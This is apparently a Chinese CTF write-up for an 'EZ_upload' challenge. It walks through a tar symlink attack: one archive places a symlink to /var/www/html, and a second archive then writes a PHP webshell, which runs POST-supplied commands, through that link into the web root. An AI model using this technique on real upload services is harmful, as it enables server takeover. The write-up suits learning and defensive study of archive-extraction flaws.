EZ_upload(tar软链接)

软链接题：

ln -s /var/www/html www
在当前目录创建一个名为 www 的符号链接（symlink），目标指向 /var/www/html。也就是说访问当前目录的 www 实际上会跟到 /var/www/html。

tar -cvf t1.tar www
把 www （此时是一个 symlink）打包成 t1.tar。tar 会把 symlink 本身记录进归档（而不是把它解析成目标目录的内容），归档里包含一个名为 www 的 symlink 条目，指向 /var/www/html。

rm www
删除当前目录下的 www 这个符号链接（仅删除链接，不会影响 /var/www/html）。

mkdir www
新建一个真实的目录 www（此时 www 是普通目录，不再是之前的 symlink）。

cd www
进入新建的目录 www（当前工作目录变成 .../www）。

vim 1.php（然后创建内容）
在 www 目录下创建 1.php

这是一个简单的后门（webshell），能执行 POST 参数 c 里的命令并回显。

ls
查看文件名

tar -cvf t2.tar www/1.php
把 www/1.php（相对于你最开始运行命令的路径，这条命令会把路径信息 www/1.php 存入 t2.tar）打包为 t2.tar。注意归档里保存的路径包含前缀 www/1.php。

先上传t1.tar,再上传t2.tar

解包 t1.tar：因为 t1.tar 里包含一个名为 www 的 symlink（指向 /var/www/html），tar 在解包时会在 /tmp/upload 下创建 一个符号链接 www 指向 /var/www/html。

解包 t2.tar：t2.tar 里包含路径 www/1.php。当 tar 要写入 www/1.php 时，www 已经是一个 symlink 了，文件写入会跟随 symlink 写到 /var/www/html/1.php（即 web 根目录下）
